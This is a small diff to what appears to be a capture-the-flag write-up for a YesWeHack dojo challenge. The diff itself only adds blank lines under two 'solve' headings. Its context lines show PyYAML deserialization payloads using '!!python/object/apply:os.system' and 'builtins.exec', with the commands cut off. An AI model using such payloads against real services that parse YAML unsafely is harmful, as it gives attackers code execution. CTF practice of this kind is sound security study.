@@ -3,6 +3,7 @@
 curl -sI https://dojo-yeswehack.com | grep -i '^date:' | cut -d' ' -f2-
 ````
 ## solve 1 
+
 ````bash
 firmware:
   version: !!python/object/apply:os.system
@@ -11,6 +12,7 @@ firmware:
 ````
 
 ## solve2 
+
 ````bash
 firmware:
   version: !!python/object/apply:builtins.exec 
